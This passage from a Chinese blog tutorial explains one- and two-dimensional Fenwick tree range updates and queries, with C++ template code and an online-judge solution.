class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.1137820000000005em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361130000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>因此我么只需要维护维护两个数组即可。</p>
<p>下面是代码(全开<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>l</mi><mi>o</mi><mi>n</mi><mi>g</mi><mtext>  </mtext><mi>l</mi><mi>o</mi><mi>n</mi><mi>g</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;long\;long\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>才过了最后一个点。。。。。。）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ll <span class="title">LowBit</span><span class="params">(ll x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> ll N=<span class="number">100000</span>+<span class="number">5</span>;</span><br><span class="line">ll n,m;</span><br><span class="line">ll arr[N];</span><br><span class="line">ll tree1[N],tree2[N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(ll j,ll x,<span class="keyword">int</span> op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(ll i=j;i&lt;=n;i+=<span class="built_in">LowBit</span>(i))</span><br><span class="line">            tree1[i]+=x;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(ll i=j;i&lt;=n;i+=<span class="built_in">LowBit</span>(i))</span><br><span class="line">            tree2[i]+=x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">query</span><span class="params">(ll x,<span class="keyword">int</span> op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(ll i=x;i!=<span class="number">0</span>;i-=<span class="built_in">LowBit</span>(i))</span><br><span class="line">            ans+=tree1[i];</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (ll i = x; i !=<span class="number">0</span> ; i-=<span class="built_in">LowBit</span>(i)) &#123;</span><br><span class="line">            ans+=tree2[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(ll i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;arr[i]);</span><br><span class="line">        <span class="built_in">update</span>(i,arr[i],<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">update</span>(i,i*arr[i],<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> op[<span class="number">15</span>];</span><br><span class="line">    ll ai,x,s;</span><br><span class="line">    <span class="keyword">while</span>(m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,op);</span><br><span class="line">        <span class="keyword">if</span>(op[<span class="number">0</span>]==<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;s);</span><br><span class="line">            ll res=(s+<span class="number">1</span>)*<span class="built_in">query</span>(s,<span class="number">1</span>)-<span class="built_in">query</span>(s,<span class="number">2</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld&quot;</span>,&amp;ai,&amp;x);</span><br><span class="line">            ll temp=x-arr[ai];</span><br><span class="line">            arr[ai]=x;</span><br><span class="line">            <span class="built_in">update</span>(ai,temp,<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">update</span>(ai,ai*temp,<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="二维-单点修改区间查询"><a class="markdownIt-Anchor" href="#二维-单点修改区间查询"></a> 【二维】 单点修改，区间查询</h4>
<p>先放出这一类题的模板代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//while用for写也是一样的</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> _y = y;</span><br><span class="line">    <span class="keyword">while</span>(x &lt;= n)&#123;</span><br><span class="line">        y = _y;</span><br><span class="line">        <span class="keyword">while</span>(y &lt;= n)</span><br><span class="line">            tree[x][y] += z, y += <span class="built_in">lowbit</span>(y);</span><br><span class="line">        x += <span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>, _y = y;</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        y = _y;</span><br><span class="line">        <span class="keyword">while</span>(y)</span><br><span class="line">            ans += tree[x][y], y -= <span class="built_in">lowbit</span>(y);</span><br><span class="line">        x -= <span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是简单的在一维的基础上扩展到了二维平面，计算某个矩形范围内的累加和可以转化为4个端点与原点构成的矩形的累加和的运算关系。当求与原点构成的矩形的累加和时就是上面的代码类型。下面看OJ上的一道题：</p>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/22/problem/P0410">oj | 移动电话</a></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211102223119.png" alt="移动电话" /></p>
<p>这一题需要注意的是输入端点坐标时，是以0开始的，最开始没注意忘了考虑边界情况，最后索性就在存储时统一加一存储，这样两条带0坐标的射线全部初始化为0即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">1025</span>][<span class="number">1025</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> ll <span class="title">LowBit</span><span class="params">(ll x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,ll d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x;i&lt;=s;i+=<span class="built_in">LowBit</span>(i))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=y;j&lt;=s;j+=<span class="built_in">LowBit</span>(j))</span><br><span class="line">        &#123;</span><br><span class="line">            arr[i][j]+=d;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">query</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x;i!=<span class="number">0</span>;i-=<span class="built_in">LowBit</span>(i))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=y;j!=<span class="number">0</span>;j-=<span class="built_in">LowBit</span>(j))</span><br><span class="line">        &#123;</span><br><span class="line">            res+=arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">range_query</span><span class="params">(<span class="keyword">int</span> x1,<span class="keyword">int</span> y1,<span class="keyword">int</span> x2,<span class="keyword">int</span> y2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">query</span>(x2,y2)-<span class="built_in">query</span>(x2,y1<span class="number">-1</span>)-<span class="built_in">query</span>(x1<span class="number">-1</span>,y2)+<span class="built_in">query</span>(x1<span class="number">-1</span>,y1<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;temp,&amp;s);</span><br><span class="line">    <span class="keyword">int</span> x1,y1,x2,y2;</span><br><span class="line">    ll d;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(temp==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %lld&quot;</span>,&amp;x1,&amp;y1,&amp;d);</span><br><span class="line">            <span class="built_in">update</span>(x1+<span class="number">1</span>,y1+<span class="number">1</span>,d);</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>,&amp;x1,&amp;y1,&amp;x2,&amp;y2);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">range_query</span>(x1+<span class="number">1</span>,y1+<span class="number">1</span>,x2+<span class="number">1</span>,y2+<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="二维-区间修改单点查询"><a class="markdownIt-Anchor" href="#二维-区间修改单点查询"></a> 【二维】 区间修改，单点查询</h4>
<p>类似于一维的处理，可以设差分数组<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>d</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>a</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>−</mo><mi>a</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>−</mo><mi>a</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>+</mo><mi>a</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;d[i]=a[i][j]-a[i-1][j]-a[i][j-1]+a[i-1][j-1]\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>。</p>
<p>模板代码记录：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span></span>&#123; </span><br><span class="line">    <span class="keyword">int</span> _y = y;</span><br><span class="line">    <span class="keyword">while</span>(x &lt;= n)&#123;</span><br><span class="line">        y = _y;</span><br><span class="line">        <span class="keyword">while</span>(y &lt;= n)</span><br><span class="line">            tree[x][y] += z, y += y &amp; -y;</span><br><span class="line">        x += x &amp; -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">range_update</span><span class="params">(<span class="keyword">int</span> x1, <span class="keyword">int</span> y1, <span class="keyword">int</span> x2, <span class="keyword">int</span> y2, <span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">    update(x1, y1, val);</span><br><span class="line">    update(x1, y2 + <span class="number">1</span>, -val);</span><br><span class="line">    update(x2 + <span class="number">1</span>, y1, -val);</span><br><span class="line">    update(x2 + <span class="number">1</span>, y2 + <span class="number">1</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ask</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>, _y = y;</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        y = _y;</span><br><span class="line">        <span class="keyword">while</span>(y)</span><br><span class="line">            ans += tree[x][y], y -= lowbit(y);</span><br><span class="line">        x -= lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例题有待补充。</p>
<h4 id="二维-区间修改区间查询"><a class="markdownIt-Anchor" href="#二维-区间修改区间查询"></a> 【二维】 区间修改，区间查询</h4>
<p>类比于一维的区间修改区间查询，这里仍旧是利用差分的思想，设置数组<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>d</mi><mo stretchy="false">[</mo><mi>h</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;d[h][k]\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">h</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>,计算点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>的前缀和即为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>x</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>y</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>i</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>j</mi></msubsup><mi>d</mi><mo stretchy="false">[</mo><mi>h</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\sum_{i=1}^x\sum_{j=1}^y\sum_{k=1}^i\sum_{k=1}^jd[h][k]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.400382em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029000000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.964564em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.964564em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029000000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord mathdefault">h</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mclose">]</span></span></span></span>,这样直接计算的复杂度是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>4</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，因此要用空间换时间。</p>
<p>由于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">d[1][1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span></span></span></span>出现了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∗</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x*y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>次，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">d[1][2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span></span></span></span>出现了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x*(y-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord 